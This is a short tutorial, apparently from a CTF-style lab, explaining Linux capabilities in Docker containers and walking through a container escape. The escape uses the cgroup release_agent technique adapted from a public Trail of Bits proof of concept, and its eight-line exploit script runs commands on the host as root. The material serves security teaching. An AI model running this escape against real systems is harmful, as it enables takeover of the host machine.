## What is Capabilities?
Capabilities in Linux are root permissions given to certain processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges. These capabilities determine what permissions a Docker container has to the operating system. Docker containers can run in two modes:
- **User (Normal) mode**: Only restricted to Docker engine.
- **Privileged mode**: Able to access and run command on host OS as root.
## Viewing Container Capabilities
We can use utility such as `capsh` which comes with the `libcap2-bin` package to list the capabilities our container has. For example:
```bash
capsh --print
```
This command would return capabilities and we might be able to see something of interest, for eample:
```bash
Current: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid
```
## Exploiting Capabilities
The code snippet below is based upon (but a modified) version of the [Proof of Concept (PoC) created by Trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.), which details the inner workings of this exploit well.
```
1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
2. echo 1 > /tmp/cgrp/x/notify_on_release
3. host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
4. echo "$host_path/exploit" > /tmp/cgrp/release_agent
5. echo '#!/bin/sh' > /exploit
6. echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
7. chmod a+x /exploit
8. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

For the first step, we need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses `cgroups` to manage processes on the operating system. Since we can manage `cgroups` as root on the host, we'll mount this to `/tmp/cgrp` on the container.